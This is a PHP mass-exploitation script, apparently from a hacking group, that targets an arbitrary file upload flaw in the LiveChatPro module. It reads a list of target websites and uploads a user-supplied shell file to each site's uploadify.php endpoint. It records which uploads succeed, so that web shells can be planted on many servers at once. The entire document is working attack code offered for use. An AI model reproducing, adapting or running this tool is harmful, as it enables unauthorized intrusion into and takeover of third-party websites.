<?php
echo "

 __  __     _                          
 \ \/ /__ _(_)                         
  >  </ _` | |                         
 /_/\_\__,_|_|     _ _         _       
 / __|_  _ _ _  __| (_)__ __ _| |_ ___ 
 \__ \ || | ' \/ _` | / _/ _` |  _/ -_)
 |___/\_, |_||_\__,_|_\__\__,_|\__\___|
      |__/                             
\n";
echo "# Author : MarsHall\n";
echo "# Tools  : Arbitrary File Upload LiveChatPro\n";
echo "# contact : syalpra@xaisyndicate.id\n";
echo "[+] Your Shell : ";
$shell = trim(fgets(STDIN));
echo "[+] Save As : (example.txt) : ";
$save = trim(fgets(STDIN));
$url = file_get_contents('chat.txt');
echo "\n";
$sl = explode("\n", $url);
touch("$save");


foreach($sl as $h){
$target = "$h/modules/livechatpro/views/js/uploadify/uploadify.php";        
$file = new CURLFile(realpath($shell));
$Ngaplod = array (
        'Filedata' => $file
              );    

    $shall = curl_init();
    curl_setopt($shall, CURLOPT_URL, $target);
    curl_setopt($shall, CURLOPT_HEADER, 1);
    curl_setopt($shall, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($shall, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible;)");   
    curl_setopt($shall, CURLOPT_HTTPHEADER,array('Content-Type: multipart/form-data'));
    curl_setopt($shall, CURLOPT_FRESH_CONNECT, 1);   
    curl_setopt($shall, CURLOPT_FORBID_REUSE, 1);  
    curl_setopt($shall, CURLOPT_TIMEOUT, 100);
    curl_setopt($shall, CURLOPT_POST, 1);
    curl_setopt($shall, CURLOPT_POSTFIELDS, $Ngaplod);
    $result = curl_exec($shall);
    
    preg_match("/HTTP\/1.1 200/i", $result, $sukses);
    
    if (!empty($sukses)){
    
    echo "[+] $h => BERHASIL\n";
    $o = fopen("$save", 'a');
    fwrite($o,"$result\n\n");
    fclose($o);
    
    } else {
    
    echo "[×] $h => GAGAL\n";
    }  
  }
?>